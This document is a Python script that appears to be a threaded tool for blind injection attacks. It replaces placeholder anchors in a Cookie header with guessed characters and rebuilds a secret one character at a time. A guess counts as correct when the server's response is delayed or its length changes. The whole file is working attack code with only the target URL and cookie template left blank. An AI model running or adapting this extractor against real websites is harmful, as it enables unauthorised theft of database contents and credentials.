import string
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures.thread
import time

import requests

def timer(method):
    '''Decorator used to count the interval between the request and response'''
    def timed(*args, **kwargs):
        ts = time.time()
        result = method(*args, **kwargs)
        te = time.time()
        # add the time elasped to the return value
        return result + (te - ts,)
    return timed

@timer
def make_request_get(url, options, passed_params):
    '''Make a single request'''
    if 'headers' in options:
        response = requests.get(url, headers=options['headers'])
    else:
        response = requests.get(url)
    return response, passed_params

TIME_BASED = True
SLEEP_TIME = 10
WORDLIST = string.ascii_letters + string.digits

# it will replace these 2 anchors with the value to be brute forced.
ANCHOR_INJ = '$$INJ$$'
ANCHOR_INDEX = '$$INDEX$$'

TARGET = ''
HEADER = {'Cookie':""}
result = ''
length = 30
thread_num = 62
threads = []

default_length = len(requests.get(TARGET).text)

with ThreadPoolExecutor(max_workers=thread_num) as executor:
    for index in range(1, length+1):
        find = False
        for char in WORDLIST:
            headers = copy.deepcopy(HEADER)
            headers['Cookie'] = HEADER['Cookie'].replace(ANCHOR_INJ, result + char)
            headers['Cookie'] = headers['Cookie'].replace(ANCHOR_INDEX, str(index))
            threads.append(executor.submit(make_request_get, TARGET, {'headers':headers}, char))
        for thread in as_completed(threads):
            request, char, time_used = thread.result()
            print(char + ' : ' + str(time_used))
            if TIME_BASED and time_used > SLEEP_TIME:
                find = True
            elif len(request.text) != default_length:
                find = True
            if find == True:
                result += char
                print('progress: {}'.format(result))
                # kill other threads once a match is found
                executor._threads.clear()
                concurrent.futures.thread._threads_queues.clear()
                threads = []
                break
        if not find:
            print('no matched characters at {}'.format(index))
            break
            
def sanity_check(payload):
    return '$$INJ$$' in payload